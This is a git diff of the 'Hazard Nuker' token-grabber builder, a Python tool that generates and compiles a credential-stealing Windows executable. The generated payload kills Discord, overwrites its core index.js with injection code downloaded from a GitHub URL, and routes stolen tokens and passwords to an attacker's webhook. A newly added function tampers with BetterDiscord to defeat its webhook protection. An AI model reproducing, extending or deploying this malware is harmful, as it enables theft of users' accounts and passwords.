@@ -1,4 +1,5 @@
 # Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
+# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
 # Hazard Nuker under the GNU General Public Liscense v2 (1991).
 
 import os
@@ -6,19 +7,20 @@ import shutil
 import Hazard
 
 from colorama import Fore
+from util.plugins.common import install_lib, setTitle
 
 def TokenGrabber(WebHook, fileName):
     password_stealer = False
-    try:
-        import psutil
-        print(f'\n{Fore.GREEN}Psutil already installed, proceeding. . .{Fore.RESET}')
-    except ModuleNotFoundError:
-        print(f'\n{Fore.YELLOW}Psutil not found | Installing it for you{Fore.RESET}\n')
-        os.system("pip install psutil")
     choice = str(input(
-        f'\n{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Do you want it to steal password? (Y to enable): {Fore.LIGHTRED_EX}'))
-    if choice.upper() == 'Y':
+        f'\n{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Do you want it to steal password? (Y to enable): {Fore.RED}'))
+    if choice.upper() == 'Y'.upper():
         password_stealer = True
+    required = [
+        'pycryptodome',
+        'pypiwin32', 
+        'psutil',
+    ]
+    install_lib(required)
     print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
     try:
         with open(f"{fileName}.py", 'w', encoding="utf-8") as TokenFile:
@@ -243,41 +245,43 @@ def main():
     except:
         pass
 
+def bypass_better_discord():
+    bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
+    with open(bd, "rt", encoding="cp437") as f:
+        content = f.read()
+        content2 = content.replace("api/webhooks", "RdimoTheGoat")
+    with open(bd, 'w'): pass
+    with open(bd, "wt", encoding="cp437") as f:
+        f.write(content2)
+
 def HazardStealer():
     for proc in psutil.process_iter():
-        if any(procstr in proc.name() for procstr in\\
-        ['discord', 'Discord', 'DISCORD',]):
+        if any(procstr in proc.name() for procstr in\
+        ['Discord', 'DiscordCanary', 'DiscordDevelopment', 'DiscordPTB']):
             proc.kill()
     for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
         for name in dirs:
-            if (name.__contains__("discord_desktop_core-")):
+            if "discord_desktop_core-" in name:
                 try:
-                    directory_list = os.path.join(root, name+"\\\\discord_desktop_core\\\\index.js")
-                    try:
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
-                    except FileExistsError:
-                        pass
-                    f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
-                    index_content = f.read()
-                    with open(directory_list, 'wb') as index_file:
-                        index_file.write(index_content)
-                    with open(directory_list, 'r+') as index_file2:
-                        replace_string = index_file2.read().replace("%WEBHOOK_LINK%", webhook_url)
-                    with open(directory_list, 'w'): pass
-                    with open(directory_list, 'r+') as index_file3:
-                        index_file3.write(replace_string)
-                except Exception:
+                    directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
+                    os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
+                except FileNotFoundError:
                     pass
-    for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Discord Inc"):
+                f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
+                with open(directory_list, 'w', encoding="utf-8") as index_file:
+                    index_file.write(f)
+    for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
         for name in files:
             discord_file = os.path.join(root, name)
             os.startfile(discord_file)
 
 if __name__ == "__main__":
+    if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
+        bypass_better_discord()
     main()
     if password_stealer:
         HazardStealer()
-""".replace("YOUR_WEBHOOK_HERE", WebHook).replace("False%", "True" if password_stealer else "False")) #100% some way of making this better
+""".replace("YOUR_WEBHOOK_HERE", WebHook).replace("False%", "True" if password_stealer else "False"))
 
         os.system(f"pyinstaller --onefile --noconsole --log-level=INFO -i NONE -n {fileName} {fileName}.py")
         shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
